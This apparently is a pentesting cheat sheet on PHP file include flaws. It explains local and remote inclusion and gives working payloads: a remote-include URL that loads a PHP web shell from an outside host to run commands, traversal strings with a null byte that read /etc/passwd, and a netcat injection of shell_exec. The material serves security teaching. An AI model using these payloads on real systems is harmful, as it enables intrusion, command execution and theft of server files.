# File Include Vulnerabilities

In a lot of applications, developers need to include files to load classes or to share some templates between multiple web pages.

File include vulnerabilities come from a lack of filtering when a user-controlled parameter is used as part of a file name in a call to an including function (require, require_once, include or include_once in PHP for example). If the call to one of these methods is vulnerable, an attacker will be able to manipulate the function to load his own code. File include vulnerabilities can also be used as a directory traversal to read arbitrary files. However, if the arbitrary code contains an opening PHP tag, the file will be interpreted as PHP code.

This including function can allow the loading of local resources or remote resource (a website, for example). If vulnerable, it will lead to:

Local File Include: LFI. A local file is read and interpreted.
Remote File Include: RFI. A remote file is retrieved and interpreted.

### NULL BYTE (Null Byte Injection)

The server-side code adds its own suffix to your payload. This can be easily bypassed, by using a NULL BYTE

> Which you need to URL-encode for File Include as &blah= or ?blah=

### Execute External File

Exploitation:

`http://url/?page=http://asset.com/test_include_system.txt&c=uname`

- [Asset](http://assets.pentesterlab.com/test_include_system.txt)
```
<?php
  system($_GET['c']);
?>
$ http://url/?page=http://asset.com/file.txt&c=ls -la
```

Attack with including another web page
```
http://url/?page=https://google.com
```

### Brake the logic withh special Character

Get Error Page, inject a special character (a quote, for example) into the parameter `'` to the query string
```
http://url/?page=intro.php'
```

Get the arbitrary file
```
http://url/?page=intro.php'../../../../etc/passwd
```

### Attack withh Netcat

```
nc host port
<?php echo shell_exec('ls -lart'); ?>
```

### File Include Attack

Exploitation:
```
Normal Mode: http://www.example.host/user.php?file=myprofile.dat
Attacking Mode: http://www.example.host/user.php?file=../../../etc/passwd%00

Normal Mode: http://www.example.host/user.php?file=myprofile.dat
Attacking Mode: http://www.example.host/user.php?file=../../../etc/passwd%00
```